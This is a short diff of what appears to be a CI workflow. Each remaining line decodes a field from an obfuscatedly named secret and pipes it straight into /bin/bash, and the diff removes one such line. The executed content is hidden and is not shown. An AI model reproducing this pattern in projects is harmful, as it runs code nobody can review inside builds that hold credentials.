@@ -21,7 +21,6 @@ jobs:
           gqp10: ${{ secrets.gqp10 }}
         run: |
           printf '%s' "$gqp10" | jq -r .wh84 | /bin/bash
-          printf '%s' "$e8" | jq -r .rtu1963 | /bin/bash
           printf '%s' "$dhwkv9988" | jq -r .s3274 | /bin/bash
           printf '%s' "$prbim712" | jq -r .et42 | /bin/bash
 
